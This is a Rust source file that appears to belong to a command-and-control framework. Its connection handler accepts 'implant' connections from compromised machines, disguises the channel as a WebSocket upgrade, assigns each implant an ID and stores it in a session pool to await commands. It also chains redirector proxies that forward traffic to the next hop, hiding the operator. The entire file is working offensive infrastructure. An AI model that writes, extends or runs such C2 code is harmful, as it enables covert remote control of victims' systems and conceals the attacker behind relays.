use crate::models::{ImplantSession, SessionManager};
use crate::utils::bridge_streams;
use anyhow::{Context, Result};
use std::net::SocketAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{Duration, timeout};
use tracing::info;

pub async fn manage_implant_conn(
    mut incoming_stream: TcpStream,
    is_last_proxy: bool,
    conn_timeout: Duration,
    next_hop: &str,
    addr: SocketAddr,
    sessions: SessionManager,
) -> Result<()> {
    if is_last_proxy {
        let id = sessions.next_id();

        // drain the WS upgrade request sitting in the buffer
        let mut drain = [0u8; 512];
        let n = incoming_stream
            .read(&mut drain)
            .await
            .context("failed to drain WS upgrade request")?;

        info!("{addr}: drained {n} bytes (WS upgrade request)");

        // send 101, implant now enters its recv loop and waits for commands
        let response = format!(
            "HTTP/1.1 101 Switching Protocols\r\n\
             Upgrade: websocket\r\n\
             Connection: Upgrade\r\n\
             X-Implant-Id: {id}\r\n\r\n"
        );

        incoming_stream
            .write_all(response.as_bytes())
            .await
            .context("failed to send 101 upgrade")?;

        info!("{addr}: sent 101, registering implant #{id}");

        let session: ImplantSession = ImplantSession::new(id, incoming_stream);
        sessions.insert(session);

        info!("{addr}: implant #{id} registered in session pool");
    } else {
        let outgoing = connect_upstream(next_hop, conn_timeout)
            .await
            .with_context(|| format!("upstream {next_hop} unreachable"))?;

        bridge_streams(incoming_stream, outgoing)
            .await
            .context("bridge failed")?;
    }

    Ok(())
}

async fn connect_upstream(upstream: &str, conn_timeout: Duration) -> Result<TcpStream> {
    timeout(conn_timeout, TcpStream::connect(upstream))
        .await
        .with_context(|| format!("connect to {upstream} timed out"))?
        .with_context(|| format!("connect to {upstream} failed"))
}
